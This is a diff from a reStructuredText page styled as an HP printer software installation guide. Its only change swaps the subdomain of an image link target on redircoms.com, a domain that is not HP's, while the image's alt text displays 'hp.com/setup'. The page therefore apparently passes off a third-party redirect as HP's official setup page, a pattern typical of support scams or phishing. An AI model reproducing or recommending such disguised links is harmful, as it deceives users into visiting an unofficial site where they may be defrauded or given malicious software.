@@ -15,7 +15,7 @@ HP Printer Software Download & Installation: Step-by-Step Guide
       :align: center
       :height: 100px
       :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :target: https://hs.redircoms.com
 
 .. image:: blank.png
       :width: 350px
